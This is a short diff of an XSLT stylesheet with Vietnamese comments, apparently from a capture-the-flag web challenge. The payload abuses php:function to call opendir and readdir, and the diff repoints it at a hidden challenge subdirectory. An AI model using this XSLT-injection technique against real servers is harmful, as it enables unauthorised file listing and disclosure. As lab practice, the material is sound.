@@ -9,7 +9,7 @@
     <xsl:template match="/">
 
         <!-- 1) Mở thư mục challenge (có thể dùng '.' hoặc path tuyệt đối) -->
-        <xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/')"/>
+        <xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/')"/>
         <xsl:text>&#x0A;</xsl:text>
 
         <!-- 2) Gọi readdir() nhiều lần, KHÔNG truyền tham số -->
